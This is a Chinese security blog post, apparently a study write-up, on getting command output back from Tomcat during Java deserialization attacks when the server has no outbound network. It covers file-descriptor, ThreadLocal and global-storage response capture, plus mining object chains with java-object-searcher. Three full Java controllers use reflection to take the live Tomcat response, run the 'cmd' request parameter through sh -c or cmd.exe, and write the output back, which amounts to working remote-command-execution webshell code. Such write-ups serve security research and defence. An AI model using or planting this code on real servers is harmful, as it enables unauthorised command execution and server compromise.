title: Tomcat不出网回显学习
author: bmth
tags:
  - 内存马
categories:
  - java
top_img: 'https://img-blog.csdnimg.cn/9ccd786f1507444d842ac250847885e8.png'
cover: 'https://img-blog.csdnimg.cn/9ccd786f1507444d842ac250847885e8.png'
date: 2022-09-06 10:22:00
---
![](https://img-blog.csdnimg.cn/9ccd786f1507444d842ac250847885e8.png)

## Linux回显
在学习内存马之前，先学习一下如何实现回显
### 通过文件描述符回显
[linux下java反序列化通杀回显方法的低配版实现 ](https://xz.aliyun.com/t/7307)
>通过java反序列化执行java代码，系统命令获取到发起这次请求时对应的服务端socket文件描述符，然后在文件描述符写入回显内容

问题在于如何通过java反序列化执行代码获取本次http请求用到socket的文件描述符(服务器对外开放的时fd下会有很多socket描述符)
在`/proc/net/tcp6`文件中存储了大量的连接请求
![](https://img-blog.csdnimg.cn/c7665d7de12e4f7bbbc67224a680637e.png)
其中local_address是服务端的地址和连接端口，rem_address是远程机器的地址和端口(客户端也在此记录)，因此我们可以通过remote_address字段筛选出需要的inode号
这个inode号也出现在`/proc/$PPID/fd`中
![](https://img-blog.csdnimg.cn/6310a1b311ef43b9a40a33353c0df46b.png)
获取socket思路就很明显了：
>1.通过client ip在/proc/net/tcp6文件中筛选出对应的inode号
2.通过inode号在/proc/$PPID/fd/中筛选出fd号
3.创建FileDescriptor对象
4.执行命令并向FileDescriptor对象输出命令执行结果


## Tomcat回显
### 通过ThreadLocal Response回显
[Tomcat中一种半通用回显方法 ](https://xz.aliyun.com/t/7348)

>该方法主要是从ApplicationFilterChain中提取相关对象，因此如果对Tomcat中的Filter有部署上的变动的话就不能通过此方法实现命令回显

这种方法可以兼容tomcat 789，但在Tomcat 6下无法使用

写一个测试类，并且下好断点
```java
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.ResponseBody;

import javax.servlet.http.HttpServletResponse;
import java.io.IOException;

@Controller
public class TestController {
    @ResponseBody
    @RequestMapping(value = "/test")
    public String testDemo(String input, HttpServletResponse response) throws IOException {
        System.out.println(response);
        return "Hello World!";
    }
}
```
首先来看一下response
可以发现request和response几乎就是一路传递的，并且在内存中都是同一个变量
![](https://img-blog.csdnimg.cn/632dd6dbc521410c973ccc69f187d4c9.png)
说明只要我们能获取到这些堆栈中，任何一个类的response实例即可
#### 代码分析
跟着来看一下`org.apache.catalina.core.ApplicationFilterChain`
首先在ApplicationFilterChain对象中找到了静态变量lastServicedResponse
>是一个static静态变量，不需要去获取这个变量所在的实例
是一个ThreadLocal，这样才能获取到当前线程的请求信息

![](https://img-blog.csdnimg.cn/6f83ed4daebb435f933f4932846b248b.png)
并且处理我们Controller逻辑之前，有记录request和response的动作
在internalDoFilter函数中有对该ThreadLocal变量赋值的操作
![](https://img-blog.csdnimg.cn/ddb2eb6cae7248e5be8c8bd6f160f1c7.png)
发现为false，但是我们可以反射修改啊
>1、反射修改`ApplicationDispatcher.WRAP_SAME_OBJECT`，让代码逻辑走到 if 条件里面
2、初始化`lastServicedRequest`和`lastServicedResponse`两个变量，因为默认为null
3、从`lastServicedResponse`中获取当前请求response，并且回显内容

但发现在使用response的getWriter函数时，usingWriter 变量就会被设置为true
![](https://img-blog.csdnimg.cn/9f1a1319d24d4ff7ba8a683d2ca56d52.png)
如果在一次请求中usingWriter变为了true那么在这次请求之后的结果输出时就会报错
![](https://img-blog.csdnimg.cn/ab6ea6e8b77443fd8a508091720b3e9a.png)
所以说我们还需要使用反射修复输出的报错
最后kingkk师傅的代码：
```java
import org.apache.catalina.connector.ResponseFacade;
import org.apache.catalina.core.ApplicationFilterChain;
import org.apache.catalina.connector.Response;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.ResponseBody;

import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Modifier;
import java.util.Scanner;

@Controller
@RequestMapping("/app")
public class Echo1Controller {
    @RequestMapping("/test")
    @ResponseBody
    public void testDemo() throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException {
        //反射
        Field WRAP_SAME_OBJECT_FIELD = Class.forName("org.apache.catalina.core.ApplicationDispatcher").getDeclaredField("WRAP_SAME_OBJECT");
        Field lastServicedRequestField = ApplicationFilterChain.class.getDeclaredField("lastServicedRequest");
        Field lastServicedResponseField = ApplicationFilterChain.class.getDeclaredField("lastServicedResponse");
        //获取modifiers字段
        Field modifiersField = Field.class.getDeclaredField("modifiers");
        //将变量设置为可访问
        modifiersField.setAccessible(true);

        //取消FINAL属性
        modifiersField.setInt(WRAP_SAME_OBJECT_FIELD, WRAP_SAME_OBJECT_FIELD.getModifiers() & ~Modifier.FINAL);
        modifiersField.setInt(lastServicedRequestField, lastServicedRequestField.getModifiers() & ~Modifier.FINAL);
        modifiersField.setInt(lastServicedResponseField, lastServicedResponseField.getModifiers() & ~Modifier.FINAL);
        //将变量设置为可访问
        WRAP_SAME_OBJECT_FIELD.setAccessible(true);
        lastServicedRequestField.setAccessible(true);
        lastServicedResponseField.setAccessible(true);

        //获取变量
        ThreadLocal<ServletResponse> lastServicedResponse = (ThreadLocal<ServletResponse>) lastServicedResponseField.get(null);
        ThreadLocal<ServletRequest> lastServicedRequest = (ThreadLocal<ServletRequest>) lastServicedRequestField.get(null);
        boolean WRAP_SAME_OBJECT = WRAP_SAME_OBJECT_FIELD.getBoolean(null);
        String cmd = lastServicedRequest != null ? lastServicedRequest.get().getParameter("cmd") : null;
        if (!WRAP_SAME_OBJECT || lastServicedResponse == null || lastServicedRequest == null) {
            //设置ThreadLocal对象
            lastServicedRequestField.set(null, new ThreadLocal<>());
            lastServicedResponseField.set(null, new ThreadLocal<>());
            //将变量设置为true
            WRAP_SAME_OBJECT_FIELD.setBoolean(null, true);
        } else if (cmd != null) {
            //获取lastServicedResponse中存储的变量
            ServletResponse responseFacade = lastServicedResponse.get();
            responseFacade.getWriter();
            java.io.Writer w = responseFacade.getWriter();
            Field responseField = ResponseFacade.class.getDeclaredField("response");
            responseField.setAccessible(true);
            Response response = (Response) responseField.get(responseFacade);
            Field usingWriter = Response.class.getDeclaredField("usingWriter");
            usingWriter.setAccessible(true);
            //设置usingWriter为false
            usingWriter.set((Object) response, Boolean.FALSE);

            boolean isLinux = true;
            String osTyp = System.getProperty("os.name");
            if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                isLinux = false;
            }
            String[] cmds = isLinux ? new String[]{"sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
            InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
            Scanner s = new Scanner(in).useDelimiter("\\a");
            String output = s.hasNext() ? s.next() : "";
            w.write(output);
            w.flush();
        }
    }
}
```
![](https://img-blog.csdnimg.cn/6f1f9ee4630b49bda254784140bb0021.png)
需要刷新两次的原因是因为第一次只是通过反射去修改值，这样在之后的运行中就会cache我们的请求，从而也就能获取到response
#### 缺陷分析
如果漏洞在ApplicationFilterChain获取回显Response代码之前，那么就无法获取到Tomcat Response进行回显，例如Shiro RememberMe反序列化漏洞
`org.apache.catalina.core.ApplicationFilterChain`核心代码：
```java
if (pos < n) {
    ApplicationFilterConfig filterConfig = filters[pos++];
    try {
        Filter filter = filterConfig.getFilter();
        ...
         filter.doFilter(request, response, this);//Shiro漏洞触发点
    } catch (...)
        ...
    }
}
try {
    if (ApplicationDispatcher.WRAP_SAME_OBJECT) {
        lastServicedRequest.set(request);
        lastServicedResponse.set(response);//Tomcat回显关键点
    }
    if (...){
        ...
    } else {
        servlet.service(request, response);//servlet调用点
    }
} catch (...) {
    ...
} finally {
    ...
}
```
rememberMe功能就是ShiroFilter的一个模块，这样的话在这部分逻辑中执行的代码，还没进入到cache request的操作中，此时的cache内容就是空，从而也就获取不到我们想要的response

### 通过全局存储 Response回显
[Tomcat的一种通用回显方法研究](https://zhuanlan.zhihu.com/p/114625962)
[ 基于全局储存的新思路 | Tomcat的一种通用回显方法研究 ](https://mp.weixin.qq.com/s/O9Qy0xMen8ufc3ecC33z6A)

>通过`Thread.currentThread().getContextClassLoader()`最终获取到request
>
只可用于Tomcat 8 9
#### 代码分析
同理先看看Tomcat中哪个类会存储Request以及Response，看到
![](https://img-blog.csdnimg.cn/676305b5bf084eb9b1266d1d861f5e5f.png)
发现Http11Processor类继承了AbstractProcessor类
![](https://img-blog.csdnimg.cn/48a26251765545a581ca50ef6a928976.png)

跟进AbstractProcessor类发现有Request以及Response，而且这两个都是final类型，也就是说其在赋值之后，对于对象的引用是不会改变的，那么我们只要能够获取到这个Http11Processor就肯定可以拿到Request和Response
![](https://img-blog.csdnimg.cn/3408ad9ec01e4c2cbcda687fe9076b00.png)
因为不是静态变量因此要向上溯源，继续翻阅调用栈，在AbstractProtcol内部类ConnectionHandler的register方法在处理的时候就将当前的Processor的信息存储在了global中

rp为RequestInfo对象，其中包含了request对象，然而request对象包含了response对象，所以我们一旦拿到RequestInfo对象就可以获取到对应的response对象
![](https://img-blog.csdnimg.cn/e9c3594ecb8d47169fe8739b767178b4.png)

在register代码中把RequestInfo注册到了global中
![](https://img-blog.csdnimg.cn/06d68abd3ea641c983a77156a5124efc.png)

这个RequestGroupInfo类型的核心就是一个存储所有RequestInfo的List
![](https://img-blog.csdnimg.cn/a572edf18b8e4d018d762b3ebc0d396e.png)
现在的利用链：
```
AbstractProtocol$ConnectoinHandler->global->RequestInfo->Request->Response
```
再往后看调用栈，现在要寻找有没有地方有存储AbstractProtocol(继承AbstractProtocol的类)

在CoyoteAdapter的service方法中，发现CoyoteAdapter的connector有很多关于Request的操作
![](https://img-blog.csdnimg.cn/63db2831b4424d01a40bceab58f3e538.png)
其中的connector对象protocolHandler属性为Http11NioProtocol，Http11NioProtocol的handler就是`AbstractProtocol$ConnectoinHandler`
![](https://img-blog.csdnimg.cn/0b2a22d4d60c4262ad3e96621dc9da12.png)

```
connector->protocolHandler->handler->AbstractProtocol$ConnectoinHandler->global->RequestInfo->Request->Response
```
而在Tomcat启动过程中会创建connector对象
![](https://img-blog.csdnimg.cn/4ce414b8e84d4a74a15462f4bcff386c.png)
并通过addConnector函数存放在connectors中
![](https://img-blog.csdnimg.cn/2ef7f80415884126aa9ad843c36ae1c4.png)
这里的Service为StandardService
```
StandardService->connectors->connector->protocolHandler->handler->AbstractProtocol$ConnectoinHandler->global->RequestInfo->Request->Response
```
connectors同样为非静态属性，那么我们就需要获取在tomcat中已经存在的StandardService对象，而不是新创建的对象

>**Tomcat的类加载机制并不是传统的双亲委派机制，因为传统的双亲委派机制并不适用于多个Web App的情况**
假设WebApp A依赖了common-collection 3.1，而WebApp B依赖了common-collection 3.2 这样在加载的时候由于全限定名相同，不能同时加载，所以必须对各个webapp进行隔离，如果使用双亲委派机制，那么在加载一个类的时候会先去他的父加载器加载，这样就无法实现隔离，tomcat隔离的实现方式是每个WebApp用一个独有的ClassLoader实例来优先处理加载，并不会传递给父加载器
这个定制的ClassLoader就是WebappClassLoader

>那么如何破坏Java原有的类加载机制呢？如果上层的ClassLoader需要调用下层的ClassLoader怎么办呢？就需要使用Thread Context ClassLoader，线程上下文类加载器。Thread类中有getContextClassLoader()和setContextClassLoader(ClassLoader cl)方法用来获取和设置上下文类加载器，如果没有setContextClassLoader(ClassLoader cl)方法通过设置类加载器，那么线程将继承父线程的上下文类加载器，如果在应用程序的全局范围内都没有设置的话，那么这个上下文类加载器默认就是应用程序类加载器。对于Tomcat来说ContextClassLoader被设置为WebAppClassLoader(在一些框架中可能是继承了public abstract WebappClassLoaderBase的其他Loader)

**其实WebappClassLoaderBase就是我们寻找的Thread和Tomcat 运行上下文的联系之一**
调试看下`Thread.currentThread().getContextClassLoader()`中的内容
![](https://img-blog.csdnimg.cn/77112e61f53a4631bb0d10f24b9d1de5.png)
最后的调用链
```
WebappClassLoader->resources->context->context->StandardService->connectors->connector->protocolHandler->handler->AbstractProtocol$ConnectoinHandler->global->RequestInfo->Request->Response
```
在这个调用链中一些变量有get方法，所以可以通过get函数很方便的执行调用链
对于那些私有保护属性的变量我们只能采用反射的方式动态的获取

最后Litch1师傅实现的代码：
```java
import org.apache.catalina.connector.Response;
import org.apache.catalina.connector.ResponseFacade;
import org.apache.coyote.RequestGroupInfo;
import org.apache.coyote.RequestInfo;
import org.apache.tomcat.util.net.AbstractEndpoint;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.ResponseBody;

import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Field;
import java.util.Scanner;

@Controller
@RequestMapping("/app")
public class Echo2Controller {
    @RequestMapping("/test2")
    @ResponseBody
    public void testDemo() throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException {
        //获取Tomcat CloassLoader context
        org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase = (org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
        org.apache.catalina.core.StandardContext standardContext = (org.apache.catalina.core.StandardContext) webappClassLoaderBase.getResources().getContext();

        //获取standardContext的context
        Field contextField = Class.forName("org.apache.catalina.core.StandardContext").getDeclaredField("context");
        contextField.setAccessible(true);
        org.apache.catalina.core.ApplicationContext ApplicationContext = (org.apache.catalina.core.ApplicationContext) contextField.get(standardContext);

        //获取ApplicationContext的service
        Field serviceField = Class.forName("org.apache.catalina.core.ApplicationContext").getDeclaredField("service");
        serviceField.setAccessible(true);
        org.apache.catalina.core.StandardService standardService = (org.apache.catalina.core.StandardService) serviceField.get(ApplicationContext);

        //获取StandardService的connectors
        Field connectorsField = Class.forName("org.apache.catalina.core.StandardService").getDeclaredField("connectors");
        connectorsField.setAccessible(true);
        org.apache.catalina.connector.Connector[] connectors = (org.apache.catalina.connector.Connector[]) connectorsField.get(standardService);

        //获取AbstractProtocol的handler
        org.apache.coyote.ProtocolHandler protocolHandler = connectors[0].getProtocolHandler();
        Field handlerField = org.apache.coyote.AbstractProtocol.class.getDeclaredField("handler");
        handlerField.setAccessible(true);
        org.apache.tomcat.util.net.AbstractEndpoint.Handler handler = (AbstractEndpoint.Handler) handlerField.get(protocolHandler);

        //获取内部类ConnectionHandler的global
        Field globalField = Class.forName("org.apache.coyote.AbstractProtocol$ConnectionHandler").getDeclaredField("global");
        globalField.setAccessible(true);
        RequestGroupInfo global = (RequestGroupInfo) globalField.get(handler);

        //获取RequestGroupInfo的processors
        Field processors = Class.forName("org.apache.coyote.RequestGroupInfo").getDeclaredField("processors");
        processors.setAccessible(true);
        java.util.List<RequestInfo> RequestInfolist = (java.util.List<RequestInfo>) processors.get(global);

        //获取Response，并做输出处理
        Field req = Class.forName("org.apache.coyote.RequestInfo").getDeclaredField("req");
        req.setAccessible(true);
        for (RequestInfo requestInfo : RequestInfolist) {
            org.apache.coyote.Request request1 = (org.apache.coyote.Request) req.get(requestInfo);
            org.apache.catalina.connector.Request request2 = (org.apache.catalina.connector.Request) request1.getNote(1);
            org.apache.catalina.connector.Response response2 = request2.getResponse();
            java.io.Writer w = response2.getWriter();

            String cmd = request2.getParameter("cmd");
            boolean isLinux = true;
            String osTyp = System.getProperty("os.name");
            if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                isLinux = false;
            }
            String[] cmds = isLinux ? new String[]{"sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
            InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
            Scanner s = new Scanner(in).useDelimiter("\\a");
            String output = s.hasNext() ? s.next() : "";
            w.write(output);
            w.flush();
            Field responseField = ResponseFacade.class.getDeclaredField("response");
            responseField.setAccessible(true);
            Field usingWriter = Response.class.getDeclaredField("usingWriter");
            usingWriter.setAccessible(true);
            usingWriter.set(response2, Boolean.FALSE);
        }
    }
}
```
![](https://img-blog.csdnimg.cn/3521355cceeb4f34b57b89ec0af5079a.png)
#### 局限性
利用链过长，会导致http包超长，可先修改`org.apache.coyote.http11.AbstractHttp11Protocol`的maxHeaderSize的大小，这样再次发包的时候就不会有长度限制

涉及到较多的Tomcat内部类 ，所以Tomcat版本实现改变的话就会有问题


## 半自动化挖掘
[ 半自动化挖掘request实现多种中间件回显 ](https://gv7.me/articles/2020/semi-automatic-mining-request-implements-multiple-middleware-echo/)
[Java安全之挖掘回显链](https://www.cnblogs.com/nice0e3/p/14897670.html)

项目地址：[https://github.com/c0ny1/java-object-searcher](https://github.com/c0ny1/java-object-searcher)
将java-object-searcher导入到我们的web项目
![](https://img-blog.csdnimg.cn/e9c9eb0158cf49da81b0401d0d46d234.png)
创建一个新的Controller，写入广度优先搜索的代码
```java
import com.example.memshell.josearcher.entity.Keyword;
import com.example.memshell.josearcher.searcher.SearchRequstByBFS;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.ResponseBody;

import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

@Controller
@RequestMapping("/app")
public class SearchController {
    @RequestMapping("/search")
    @ResponseBody
    public void testDemo(){
        List<Keyword> keys = new ArrayList<>();
        Keyword.Builder builder = new Keyword.Builder();
        builder.setField_type("nnn");
        keys.add(new Keyword.Builder().setField_type("ServletRequest").build());
        keys.add(new Keyword.Builder().setField_type("RequstGroup").build());
        keys.add(new Keyword.Builder().setField_type("RequestInfo").build());
        keys.add(new Keyword.Builder().setField_type("RequestGroupInfo").build());
        keys.add(new Keyword.Builder().setField_type("Request").build());
        //新建一个广度优先搜索Thread.currentThread()的搜索器
        SearchRequstByBFS searcher = new SearchRequstByBFS(Thread.currentThread(),keys);
        //打开调试模式
        searcher.setIs_debug(true);
        //挖掘深度为20
        searcher.setMax_search_depth(50);
        //设置报告保存位置
        searcher.setReport_save_path("C:\\Users\\bmth\\Desktop\\作业\\CTF学习\\java学习");
        searcher.searchObject();
    }
}
```
找到一个链子
![](https://img-blog.csdnimg.cn/37f1b73f282743c490fdffdec635a1e7.png)
debug看一下，确实存在Request对象
![](https://img-blog.csdnimg.cn/a2990869dc39477cac42ccba38fdfcc6.png)

接下来进行构造，存在两个问题：
1.`org.apache.tomcat.util.threads.TaskThread`中没有group，该类继承了Thread
Thread类中存在group
![](https://img-blog.csdnimg.cn/ea2d2da2e19e4f75ac94fdf0db19e55e.png)
2.发现thread每一次都是不一样的(第二次变为14了)，那么这里需要获取线程的名称对thread进行定位
![](https://img-blog.csdnimg.cn/878e888aba2f440e89d24414e5353989.png)

最后拿到RequestInfo，就和前面的流程一样了
```java
import org.apache.catalina.connector.Response;
import org.apache.catalina.connector.ResponseFacade;
import org.apache.coyote.RequestGroupInfo;
import org.apache.coyote.RequestInfo;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.ResponseBody;

import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Field;
import java.util.Scanner;

@Controller
@RequestMapping("/app")
public class Echo3Controller {
    @RequestMapping("/test3")
    @ResponseBody
    public void testDemo() throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException {
        Thread thread = Thread.currentThread();
        try {
            //获取group
            Field group = Class.forName("java.lang.Thread").getDeclaredField("group");
            group.setAccessible(true);
            ThreadGroup threadGroup = (ThreadGroup) group.get(thread);

            //获取thread
            Field threads = Class.forName("java.lang.ThreadGroup").getDeclaredField("threads");
            threads.setAccessible(true);
            Thread[] thread1 = (Thread[]) threads.get(threadGroup);

            //获取target
            for (Thread thread2 : thread1) {
                if (thread2.getName().contains("http-nio") && thread2.getName().contains("ClientPoller")) {
                    Field target = Class.forName("java.lang.Thread").getDeclaredField("target");
                    target.setAccessible(true);
                    Object o = target.get(thread2);

                    Field this$0 = o.getClass().getDeclaredField("this$0");
                    this$0.setAccessible(true);
                    Object o1 = this$0.get(o);

                    Field handler = Class.forName("org.apache.tomcat.util.net.AbstractEndpoint").getDeclaredField("handler");
                    handler.setAccessible(true);
                    Object handler1 = handler.get(o1);

                    Field global = handler1.getClass().getDeclaredField("global");
                    global.setAccessible(true);
                    RequestGroupInfo requestGroupInfo = (RequestGroupInfo) global.get(handler1);

                    Field processors = Class.forName("org.apache.coyote.RequestGroupInfo").getDeclaredField("processors");
                    processors.setAccessible(true);
                    java.util.List<RequestInfo> RequestInfo_list = (java.util.List<RequestInfo>) processors.get(requestGroupInfo);

                    Field req = Class.forName("org.apache.coyote.RequestInfo").getDeclaredField("req");
                    req.setAccessible(true);
                    for (RequestInfo requestInfo : RequestInfo_list) {
                        org.apache.coyote.Request request1 = (org.apache.coyote.Request) req.get(requestInfo);
                        org.apache.catalina.connector.Request request2 = (org.apache.catalina.connector.Request) request1.getNote(1);
                        org.apache.catalina.connector.Response response2 = request2.getResponse();
                        java.io.Writer w = response2.getWriter();

                        String cmd = request2.getParameter("cmd");
                        boolean isLinux = true;
                        String osTyp = System.getProperty("os.name");
                        if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                            isLinux = false;
                        }
                        String[] cmds = isLinux ? new String[]{"sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
                        InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                        Scanner s = new Scanner(in).useDelimiter("\\a");
                        String output = s.hasNext() ? s.next() : "";
                        w.write(output);
                        w.flush();
                        Field responseField = ResponseFacade.class.getDeclaredField("response");
                        responseField.setAccessible(true);
                        Field usingWriter = Response.class.getDeclaredField("usingWriter");
                        usingWriter.setAccessible(true);
                        usingWriter.set(response2, Boolean.FALSE);
                    }
                }
            }
        } catch (ClassNotFoundException | NoSuchFieldException | IllegalAccessException e) {
            //e.printStackTrace();
        }
    }
}
```

**回显研究：**
[基于tomcat的内存 Webshell 无文件攻击技术](https://xz.aliyun.com/t/7388)
[基于Tomcat无文件Webshell研究](https://mp.weixin.qq.com/s/whOYVsI-AkvUJTeeDWL5dA)
[tomcat不出网回显连续剧第六集 ](https://xz.aliyun.com/t/7535)
[Shiro RememberMe 漏洞检测的探索之路 ](https://blog.xray.cool/post/how-to-find-shiro-rememberme-deserialization-vulnerability/)
[Java内存马：一种Tomcat全版本获取StandardContext的新方法](https://xz.aliyun.com/t/9914)
[ Tomcat回显技术学习汇总 ](https://www.anquanke.com/post/id/264821)
[Java安全之反序列化回显与内存马](https://www.cnblogs.com/nice0e3/p/14891711.html)
